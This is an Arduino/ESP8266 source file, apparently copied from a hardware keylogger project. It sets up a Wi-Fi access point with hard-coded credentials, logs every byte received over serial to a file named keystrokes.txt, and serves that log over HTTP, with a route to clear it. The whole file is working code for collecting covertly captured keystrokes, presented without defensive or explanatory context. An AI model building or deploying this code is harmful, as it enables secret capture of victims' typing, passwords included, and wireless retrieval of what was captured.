/* 

Copied from: https://github.com/spacehuhn/wifi_keylogger/blob/master/esp8266_saveSerial/esp8266_saveSerial.ino

MIT License

Copyright (c) 2017 Stefan Kremser

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

*/

#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>                                           
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>

#define BAUD_RATE 57600

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "BTHub3-537";
const char *password = "37373737"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;
File f;

void setup() {
  
  Serial.begin(BAUD_RATE);
  
  //Serial.println(WiFi.SSID());
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096); 
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  if(!f) Serial.println("file open failed");

  f.write('a');
  f.write('b');
  f.write('c');

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
    f = SPIFFS.open("/keystrokes.txt", "a+");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });
  
  server.begin();
}

void loop() {
  
  if(Serial.available()) {
    char c = (char)Serial.read();
    f.write(c);
    //Serial.write(c);
  }  
}


